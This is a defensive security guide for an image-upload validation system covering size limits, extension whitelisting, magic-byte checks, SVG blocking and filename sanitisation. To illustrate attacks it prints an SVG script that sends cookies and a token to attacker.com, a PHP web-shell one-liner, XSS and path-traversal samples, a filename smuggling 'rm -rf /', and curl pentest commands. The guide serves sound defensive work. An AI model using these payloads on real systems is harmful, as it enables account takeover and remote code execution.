# File Upload Security Guide

**Purpose**: Prevent malicious file uploads, XSS attacks, and malware distribution.

---

## Overview

The file upload system now includes **5 layers of security validation**:

1. ✅ **File Size Validation** - Prevents DoS via large files
2. ✅ **Extension Whitelisting** - Blocks dangerous file types
3. ✅ **Magic Byte Verification** - Prevents MIME type spoofing
4. ✅ **SVG Blocking** - Prevents XSS attacks
5. ✅ **Filename Sanitization** - Prevents path traversal

---

## Security Layers Explained

### Layer 1: File Size Validation

**Limit**: 5 MB for images

**Purpose**:
- Prevent DoS attacks via massive file uploads
- Control storage costs
- Ensure reasonable performance

**Example**:
```typescript
// Blocked: 10MB image
File size 10.00MB exceeds maximum allowed size of 5MB ❌

// Allowed: 2MB image
✅ Upload successful
```

---

### Layer 2: Extension Whitelisting

**Allowed Extensions**:
- `.jpg`, `.jpeg` (JPEG images)
- `.png` (PNG images)
- `.gif` (GIF images)
- `.webp` (WebP images)

**Blocked Extensions**:
```typescript
// Security risks
.svg, .svgz           // XSS attacks
.html, .htm, .xml     // Embedded scripts
.js, .vbs, .ps1       // Script files

// Executables
.exe, .dll, .bat, .cmd, .sh, .app

// Archives (can hide malware)
.zip, .rar, .7z, .tar, .gz

// Office macros
.xlsm, .docm, .pptm
```

**Example Attack Prevented**:
```bash
# Attacker tries to upload malicious executable
shell.exe.jpg  ❌ "File type .exe is not allowed"

# Even with fake extension
malware.jpg.exe  ❌ "File type .exe is not allowed"
```

---

### Layer 3: Magic Byte Verification

**What Are Magic Bytes?**

Magic bytes are the first few bytes of a file that identify its true type, regardless of the extension or declared MIME type.

**Example**:
```
JPEG: FF D8 FF
PNG:  89 50 4E 47 0D 0A 1A 0A
GIF:  47 49 46 38 37 61
```

**Attack Scenario Prevented**:

```typescript
// Attacker creates malicious PHP script
// Names it "image.jpg"
// Sets MIME type to "image/jpeg"

const maliciousFile = new File(
  ["<?php system($_GET['cmd']); ?>"],
  "image.jpg",
  { type: "image/jpeg" }  // Fake MIME type
);

// OLD SYSTEM:
// ✅ Allowed (only checked MIME type)

// NEW SYSTEM:
// ❌ "Could not verify file type"
// Magic bytes don't match JPEG signature!
```

**How It Works**:
1. Read first 16 bytes of file
2. Compare against known image signatures
3. Reject if no match found
4. Reject if declared type ≠ detected type

---

### Layer 4: SVG Blocking

**Why Block SVG?**

SVG files can contain embedded JavaScript, making them a severe XSS risk.

**Attack Example**:

```svg
<!-- malicious.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // Steal user's session
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        localStorage: localStorage.getItem('token')
      })
    });
  </script>
  <circle cx="50" cy="50" r="40" />
</svg>
```

**What Happens**:
1. Attacker uploads malicious.svg as cover image
2. When user views shared note, SVG displays
3. JavaScript executes, stealing session
4. Attacker gains access to user's account

**Defense**:
```typescript
// ANY SVG upload attempt
filename: "image.svg"
type: "image/svg+xml"

// Result:
❌ "SVG files are not allowed due to XSS security risks"
```

**No Exceptions**: SVG is blocked even if:
- Extension is different (.svgz)
- MIME type is spoofed
- File is renamed
- Embedded in other formats

---

### Layer 5: Filename Sanitization

**Prevents**:
- Path traversal attacks
- Command injection
- Shell escaping

**How It Works**:

```typescript
// Original filename (potentially malicious)
"../../etc/passwd; rm -rf /"

// Sanitized filename
"___etc_passwd__rm_-rf__"

// Safe for storage ✅
```

**Transformations**:
1. Remove `..` (path traversal)
2. Replace special chars with `_`
3. Keep only: `a-z A-Z 0-9 . - _`
4. Limit to 100 characters

**Examples**:

| Original | Sanitized |
|----------|-----------|
| `image (1).jpg` | `image__1_.jpg` |
| `../../../etc/passwd` | `______etc_passwd` |
| `file'; DROP TABLE users--` | `file___DROP_TABLE_users__` |
| `<script>alert('xss')</script>.jpg` | `_script_alert__xss___script_.jpg` |

---

## Validation Flow

```
User Selects File
      ↓
Quick Validation (instant feedback)
  ├─ Size check
  ├─ Extension check
  └─ Basic MIME check
      ↓
Comprehensive Validation
  ├─ Read first 16 bytes
  ├─ Detect type by magic bytes
  ├─ Verify MIME type matches
  ├─ Check against whitelist
  └─ Explicitly block SVG
      ↓
Filename Sanitization
  ├─ Remove path traversal
  ├─ Strip special chars
  └─ Limit length
      ↓
Upload to Convex
      ↓
Success ✅
```

---

## Attack Scenarios & Defenses

### Scenario 1: XSS via Malicious SVG

**Attack**:
```svg
<svg onload="alert(document.cookie)">
  <circle cx="50" cy="50" r="40"/>
</svg>
```

**Defense**:
```
❌ "SVG files are not allowed due to security risks"
```

**Impact**: XSS attack completely prevented

---

### Scenario 2: MIME Type Spoofing

**Attack**:
```javascript
// Malicious PHP file disguised as JPEG
const file = new File(
  ["<?php system($_GET['cmd']); ?>"],
  "backdoor.jpg",
  { type: "image/jpeg" }  // Fake MIME type
);
```

**Defense**:
```
Magic byte check: First bytes are "3C 3F 70 68 70" (<?php)
Expected for JPEG: "FF D8 FF"

❌ "File type mismatch: declared as image/jpeg but detected as text/plain"
```

**Impact**: Code execution prevented

---

### Scenario 3: Polyglot File

**Attack**: File that's both valid image AND executable code

```
JPEG Header (FF D8 FF)
+ Malicious payload
+ JPEG Footer
```

**Defense**:
```
✅ JPEG signature detected
✅ Upload allowed
⚠️ But: File is just data in Convex storage
⚠️ Executed only if:
   - Downloaded and run locally (user responsibility)
   - Server processes it (we don't - serve as-is)
```

**Additional Protection Needed**:
- Content-Security-Policy headers (prevent inline execution)
- Serve images from separate domain (prevent cookie access)
- Add image processing (re-encode to strip payload)

---

### Scenario 4: Path Traversal

**Attack**:
```javascript
const file = new File(
  [imageData],
  "../../../etc/passwd",  // Try to overwrite system file
  { type: "image/jpeg" }
);
```

**Defense**:
```typescript
// Filename sanitization
Original: "../../../etc/passwd"
Sanitized: "______etc_passwd"

// Saved as: "upload_1699234567_a9f2c3______etc_passwd"
```

**Impact**: Cannot escape upload directory

---

## Usage

### For Developers

#### Validate Before Upload (Client)

```typescript
import { quickValidate, getUserFriendlyError } from '@/lib/fileValidation';

function handleFileSelect(file: File) {
  // Instant feedback
  const result = quickValidate(file);

  if (!result.valid) {
    alert(getUserFriendlyError(result));
    return;
  }

  // Proceed with upload
  uploadFile(file);
}
```

#### Full Validation (Server)

```typescript
import { validateImageFile } from '@/lib/fileValidation';

async function processUpload(file: File) {
  // Comprehensive validation
  const result = await validateImageFile(file);

  if (!result.valid) {
    throw new Error(result.error);
  }

  // Upload is safe ✅
  console.log('Detected type:', result.detectedType);
  console.log('MIME type:', result.mimeType);
}
```

#### Upload with Auto-Validation

```typescript
import { uploadImageToConvex } from '@/lib/imageUpload';

// Validation happens automatically
const result = await uploadImageToConvex(
  generateUploadUrl,
  saveFileMetadata,
  {
    file: selectedFile,
    noteId: currentNoteId,
    onProgress: (p) => console.log(`${p}% complete`),
  }
);

if (result.error) {
  alert(result.error);  // User-friendly error message
} else {
  console.log('Upload successful:', result.storageId);
}
```

---

### For Security Auditors

#### Test Cases

**Valid Uploads**:
```typescript
✅ JPEG (2MB): image.jpg
✅ PNG (1MB): photo.png
✅ GIF (500KB): animation.gif
✅ WebP (3MB): modern.webp
```

**Blocked Uploads**:
```typescript
❌ SVG: icon.svg → "SVG files not allowed"
❌ Large file: 10mb.jpg → "File size exceeds 5MB"
❌ Executable: virus.exe.jpg → "File type .exe not allowed"
❌ Spoofed: malware.jpg (fake MIME) → "File type mismatch"
❌ Empty: 0bytes.jpg → "File is empty"
❌ No extension: image → "File must have an extension"
```

#### Penetration Testing

```bash
# 1. Test magic byte verification
echo "<?php system('ls'); ?>" > fake.jpg
# Upload fake.jpg → Should be blocked

# 2. Test SVG blocking
curl -F "file=@malicious.svg" http://localhost:3000/api/upload
# Should return 400 error

# 3. Test path traversal
curl -F "file=@../../../etc/passwd" http://localhost:3000/api/upload
# Filename should be sanitized

# 4. Test MIME spoofing
# Create file with wrong extension
mv script.js script.jpg
# Upload → Should be blocked (magic bytes don't match)
```

---

## Best Practices

### For Development

✅ **DO**:
- Always validate on both client and server
- Use magic byte verification for all uploads
- Sanitize all filenames before storage
- Log blocked upload attempts for monitoring
- Keep block lists updated

❌ **DON'T**:
- Trust client-provided MIME types
- Allow SVG under any circumstances
- Skip validation for "trusted" users
- Store files with original filenames
- Disable validation in development

---

### For Production

✅ **DO**:
- Monitor blocked upload attempts (>100/day = suspicious)
- Review validation logs weekly
- Update magic byte signatures as needed
- Test validation after every update
- Document all bypasses found

❌ **DON'T**:
- Whitelist specific users to bypass validation
- Allow "just this once" exceptions
- Ignore repeated blocked uploads from same user
- Disable validation to "fix" upload issues

---

## Monitoring

### Metrics to Track

1. **Blocked Uploads by Reason**
   ```
   - Size exceeded: 45%
   - Invalid type: 30%
   - SVG blocked: 15%
   - Type mismatch: 10%
   ```

2. **Upload Success Rate**
   - Target: >95% for legitimate users
   - Alert if <90% (validation too strict?)

3. **Suspicious Activity**
   - Multiple SVG upload attempts from same user
   - Repeated MIME type mismatches
   - Path traversal attempts

### Logging

```typescript
// Log all blocked uploads
console.warn('Upload blocked:', {
  userId: currentUser.id,
  filename: file.name,
  reason: validationResult.error,
  timestamp: Date.now(),
});

// Alert on suspicious patterns
if (blockedCount > 5) {
  alertSecurityTeam({
    userId: currentUser.id,
    reason: 'Multiple upload validation failures',
  });
}
```

---

## Future Enhancements

### Recommended Additions

1. **Server-Side Image Processing**
   - Re-encode all images to strip metadata
   - Generate thumbnails server-side
   - Remove EXIF data (privacy)

2. **Virus Scanning**
   - Integrate ClamAV or cloud scanner
   - Scan before storing in database
   - Quarantine suspicious files

3. **Content-Security-Policy**
   - Serve images from separate domain
   - Prevent inline script execution
   - Block mixed content

4. **Advanced Detection**
   - Machine learning for anomaly detection
   - Behavioral analysis (multiple failed uploads)
   - IP reputation checking

---

## Troubleshooting

### User Reports "Can't Upload Valid Image"

**Debug Steps**:

1. Get file details:
   ```typescript
   console.log({
     name: file.name,
     size: file.size,
     type: file.type,
   });
   ```

2. Test magic bytes:
   ```typescript
   const bytes = await readFileBytes(file, 16);
   console.log('Magic bytes:', Array.from(bytes).map(b => b.toString(16)));
   ```

3. Check validation result:
   ```typescript
   const result = await validateImageFile(file);
   console.log('Validation:', result);
   ```

4. Common issues:
   - Corrupted image file
   - Unsupported format (HEIC, TIFF)
   - File edited in binary editor
   - Screenshot with wrong extension

---

## Configuration

### Adjust Limits

```typescript
// In lib/fileValidation.ts

export const FILE_SIZE_LIMITS = {
  image: 10 * 1024 * 1024, // Increase to 10MB
  default: 10 * 1024 * 1024,
};
```

### Add Allowed Format

```typescript
// In lib/fileValidation.ts

export const ALLOWED_IMAGE_SIGNATURES = {
  // ... existing signatures

  'image/bmp': {
    signatures: [[0x42, 0x4D]], // BM
    extensions: ['.bmp'],
  },
};
```

**Note**: Only add formats after security review!

---

## Support

**Security Issues**: security@noteflow.com
**Upload Problems**: support@noteflow.com
**False Positives**: engineering@noteflow.com

---

**Created**: 2025-11-08
**Last Updated**: 2025-11-08
**Version**: 1.0.0
